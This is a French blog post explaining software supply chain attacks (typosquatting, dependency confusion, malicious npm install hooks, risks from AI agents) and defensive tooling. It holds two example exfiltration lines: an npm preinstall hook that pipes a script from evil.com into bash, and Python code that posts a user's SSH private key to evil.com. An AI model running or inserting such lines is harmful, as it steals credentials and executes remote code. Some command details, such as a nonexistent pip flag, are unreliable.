---
title: "Supply Chain Attacks en 2026 : le poison dans la tuyauterie"
date: 2026-02-05 10:00 +0200
categories: ["Sécurité"]
tags: ["supply-chain", "sécurité", "npm", "pypi", "devops", "agents-ia", "infrastructure"]
author: marvax
---

> Tu vérifies ton code. Tu audites tes dépendances. Mais vérifies-tu les dépendances de tes dépendances ? En 2026, les supply chain attacks sont devenues la voie d'attaque préférée des groupes APT. Un package npm populaire compromis touche des millions de projets en une seule publication. Voici ce qui se passe réellement dans la tuyauterie.

<!--more-->

## Le problème fondamental

L'écosystème logiciel moderne repose sur une confiance aveugle :

```
Ton code
  └── 15 direct dependencies
        └── 142 transitive dependencies
              └── 3 847 packages au total
                    └── Tu en as peut-être audité 20
```

Chaque `npm install`, `pip install`, `cargo build` est un acte de foi. Tu télécharges du code exécuté sur ta machine (ou dans ta CI, ou dans ton container de production) sans l'avoir lu.

## Vecteurs d'attaque

### Typosquatting

L'attaquant publie un package dont le nom ressemble à un package populaire :

| Package légitime | Typosquat malveillant | Écosystème |
|---|---|---|
| `requests` | `requessts` | PyPI |
| `lodash` | `l0dash` | npm |
| `pillow` | `pilow` | PyPI |
| `colors` | `coIors` (i majuscule) | npm |

### Dependency confusion

L'attaquant publie un package privé (interne à une entreprise) sur le registry public avec un numéro de version supérieur. Les outils de build téléchargent la version publique.

```bash
# Scénario : ton projet interne utilise @acme/utils v1.2.0
# L'attaquant publie acme-utils v99.0.0 sur npm public
# npm résout la version publique en premier → compromis
```

### Compromission de mainteneur

Le compte d'un mainteneur légitime est compromis (phishing, credential stuffing, token volé). Une version malveillante est publiée sous le nom officiel.

### Code malveillant dans les hooks d'installation

```json
// package.json malveillant
{
  "name": "totally-legit-package",
  "scripts": {
    "preinstall": "curl http://evil.com/exfil.sh | bash",
    "postinstall": "node steal-env.js"
  }
}
```

`preinstall` et `postinstall` s'exécutent à chaque `npm install`. C'est le vecteur le plus courant sur npm.

## Incidents récents (2024-2026)

### L'écosystème npm sous pression

**2024-2025** : série de compromissions de mainteneurs npm via des emails de phishing ciblés imitant le 2FA de npm. Plusieurs packages à millions de téléchargements hebdomadaires compromis.

**2025** : un package de coloration syntaxique populaire exfiltre les variables d'environnement (`.env`) contenant des clés API et tokens. Détection après 3 semaines en production.

### PyPI : la chasse aux faux packages

**2025** : PyPI passe à l'authentification obligatoire par token pour la publication. Réduction de 60% des packages malveillants dans les mois suivants.

**2026 Q1** : campagne de typosquatting coordonnée sur PyPI ciblant les packages d'IA (`openai`, `langchain`, `transformers`). Des dizaines de faux packages publiés en quelques heures.

### L'incident [CrowdStrike](/posts/2024-07-19-CrowdStrike-ecran-bleu-mondial/)

L'écran bleu mondial de CrowdStrike en 2024 n'était pas une supply chain attack au sens strict, mais c'est la démonstration parfaite du risque : un seul fournisseur de confiance qui pousse un update défectueux paralysant des millions de machines.

## Le cas particulier des agents IA

Les [agents IA](/posts/2026-05-22-Agents-IA-bureau-sans-mains/) ajoutent une couche de risque supplémentaire :

- **Exécution automatique de code** : les agents installent et exécutent des packages sans supervision humaine
- **Chaîne de dépendances opaque** : les frameworks IA (LangChain, CrewAI, etc.) pullulent de dépendances
- **Prompts injection via packages** : un package malveillant peut injecter des instructions dans le contexte d'un agent
- **Privations excessives** : les agents tournent souvent avec des droits élevés

```python
# Scénario d'attaque via agent IA
# Un package installé par l'agent contient :

import os
# Exfiltration silencieuse
os.system("curl -X POST https://evil.com/data -d @" + os.path.expanduser("~/.ssh/id_rsa"))

# L'agent continue de fonctionner normalement
# Aucun signe visible de compromission
```

## Le cas [Log4Shell](/posts/2021-12-09-Log4Shell-lincendie-dans-la-jvm/) comme tournant

Log4Shell a été le wakeup call. Une vulnérabilité dans une bibliothèque Java utilisée par *des centaines de millions* d'applications a montré que la dépendance à des composants tiers est un risque systémique.

Ce qui a changé depuis :
- SBOM (Software Bill of Materials) devenu obligatoire dans certains contextes
- Sigstore pour la signature des packages
- Google, Microsoft et Amazon investissent dans la sécurité des registres open source

## Mitigations concrètes

### Pour les développeurs

```bash
# Vérifier les vulnérabilités connues
npm audit
pip audit
cargo audit

# Verrouiller les versions (lock files)
npm ci  # au lieu de npm install
pip install -r requirements.txt --hash-checking

# Vérifier les signatures
npm audit signatures

# Analyse statique des dépendances
# Grype, Snyk, Trivy, Dependabot
```

### Pour les équipes DevOps

Intégrer la vérification des dépendances dans la [CI/CD](/posts/2026-06-20-CICD-GitHub-Actions/) :

```yaml
# GitHub Actions — vérification des dépendances
- name: Audit npm dependencies
  run: npm audit --audit-level=high

- name: Scan container image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:latest'
    severity: 'CRITICAL,HIGH'
```

### Checklist de défense

- [ ] Lock files versionnés (`package-lock.json`, `requirements.txt` avec hashes)
- [ ] `npm audit` / `pip audit` intégré dans la CI
- [ ] Scan de vulnérabilités sur les images Docker (Trivy, Grype)
- [ ] SBOM généré pour chaque release
- [ ] Packages internes sur registry privé (Verdaccio, Artifactory)
- [ ] Renovate/Dependabot pour les mises à jour de sécurité
- [ ] Politique de review des nouveaux packages ajoutés
- [ ] Monitoring des sorties de sécurité ([Nuclei](/posts/2026-03-08-Nuclei-OpenVAS-scan-vuln/) pour les CVE)
- [ ] [Docker Security](/posts/2026-06-08-Docker-Security-Erreurs/) appliqué aux images de build
- [ ] Pipeline CI/CD durci et isolé

## Outils de détection

| Outil | Usage | Écosystème |
|---|---|---|
| npm audit | Audit des vulnérabilités npm | npm |
| pip audit | Audit des vulnérabilités Python | PyPI |
| Trivy | Scan containers + filesystem | Multi |
| Grype | Scan de vulnérabilités | Multi |
| Socket.dev | Analyse comportementale des packages npm | npm |
| Snyk | SCA intégré CI/CD | Multi |
| Sigstore | Vérification de signatures | Multi |

## La responsabilité partagée

Les registres publics ont progressé :
- **npm** : 2FA obligatoire pour les packages populaires
- **PyPI** : authentification par token obligatoire
- **crates.io** : vérification d'email obligatoire

Mais la vraie responsabilité est chez toi. Chaque `npm install` est une décision de confiance. Traite-la comme telle.

---

*Références :*
- [OWASP Software Component Verification Standard](https://owasp.org/www-project-software-component-verification-standard/)
- [Sigstore](https://www.sigstore.dev/)
- [Socket.dev](https://socket.dev/)
- [SLSA Framework](https://slsa.dev/)
- [NIST SSDF](https://csrc.nist.gov/Projects/ssdf)

*Tes dépendances sont un point d'entrée ? [Contacte-moi](mailto:m4rv4x@protonmail.com) pour auditer ta chaîne logicielle.*
